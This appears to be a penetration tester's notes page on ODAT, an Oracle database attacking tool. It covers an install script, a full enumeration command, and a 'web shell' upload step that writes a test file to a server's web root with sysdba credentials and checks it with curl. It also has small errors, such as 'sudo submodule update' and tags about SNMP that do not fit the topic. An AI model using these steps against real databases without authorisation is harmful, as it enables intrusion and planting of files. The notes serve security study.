---
title: odat - Oracle Database Attacking Tool
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - enumeration
  - snmp
  - port 161
  - tools
---

# odat - Oracle Database Attacking Tool

Oracle Database Attacking Tool (ODAT) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.

## Installation

This script installs the needed packages and tools: 

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien python3-pip -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
sudo submodule update
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```

Check installation with:

```shell-session
./odat.py -h
```


## Basic usage

We can use the `odat.py`  from [ODAT](odat.md) tool to retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations,...

```shell-session
/odat.py all -s $ip
```


**Upload a web shell to the target**: 

```shell-session
# Upload a web shell to the target. This requires the server to run a web server, and we need to know the exact location of the root directory for the webserver.

## 1. Creating a non suspicious web shell 
echo "Oracle File Upload Test" > testing.txt

## 2. Uploading the shell to linux (/var/www/html) or windows (C:\\inetpub\\wwwroot):
./odat.py utlfile -s $ip -d XE -U <user> -P <password> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

## 3. Test if the file upload approach worked with curl, or visit via browser.
curl -X GET http://$ip/testing.txt
```
